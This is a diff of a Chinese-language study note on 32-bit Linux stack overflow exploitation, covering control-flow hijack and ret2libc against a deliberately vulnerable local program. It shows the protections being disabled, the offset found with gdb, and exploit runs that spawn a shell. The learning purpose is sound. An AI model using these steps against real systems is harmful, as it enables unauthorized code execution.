@@ -11,31 +11,56 @@
 4. ROPgadget<br>
 
 ## linux_84
-
+### Control Flow Hijack 程序流劫持
 $ gcc -fno-stack-protector -z execstack  -m32 -o level1 level1.c<br>
-因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib
-$ sudo -s
-$ echo 0 > /proc/sys/kernel/randomize_va_space
-$ exit
-$ python pattern.py create 150得到
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
-$ gdb ./level1
-（gdb)run 得到
-Program received signal SIGSEGV, Segmentation fault.
-0x37654136 in ?? ()
-（gdb）quit
-$ python pattern.py offset 0x37654136 得到
-hex pattern decoded as: 6Ae7
-140
-$ ulimit -c unlimited
-$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
-$ ./level1 得到
-ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-段错误 (核心已转储)
-$ gdb level1 /tmp/core.1545029320
-Program terminated with signal SIGSEGV, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb) x/10s $esp -144
-0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"
-0xffffd099:	""
-$ python exp1.py
+因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib<br>
+$ sudo -s<br>
+$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
+$ exit<br>
+$ python pattern.py create 150得到<br>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9<br>
+$ gdb ./level1<br>
+（gdb)run 得到<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x37654136 in ?? ()<br>
+（gdb）quit<br>
+$ python pattern.py offset 0x37654136 得到<br>
+hex pattern decoded as: 6Ae7<br>
+140<br>
+$ ulimit -c unlimited<br>
+$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br>
+$ ./level1 得到<br>
+ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+段错误 (核心已转储)<br>
+$ gdb level1 /tmp/core.1545029320<br>
+Program terminated with signal SIGSEGV, Segmentation fault.<br>
+#0  0x41414141 in ?? ()<br>
+(gdb) x/10s $esp -144<br>
+0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
+0xffffd099:	""<br>
+$ python exp1.py<br>
+$ python exp1.py<br>
+[+] Starting local process './level1': pid 14146<br>
+[*] Switching to interactive mode<br>
+$ whoami<br>
+[用户名] <br><br>
+
+### Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护
+$  gcc -fno-stack-protector -m32 -o level2 level1.c<br>
+$ gdb ./level2<br>
+(gdb) break main<br>
+Breakpoint 1 at 0x80484ea<br>
+(gdb) run<br>
+Breakpoint 1, 0x080484ea in main ()<br>
+(gdb) print system 得到<br>
+$1 = {<text variable, no debug info>} 0xf7e3f940 <system><br>
+(gdb) print __libc_start_main<br>
+$2 = {<text variable, no debug info>} 0xf7e1d540 <__libc_start_main><br>
+(gdb) find 0xf7e1d540, +2200000, "/bin/sh"<br>
+0xf7f5e02b<br>
+(gdb）quit
+$ python exp2.py
+[+] Starting local process './level2': pid 14319
+[*] Switching to interactive mode
+$ whoami<br>
+[用户名] <br><br>
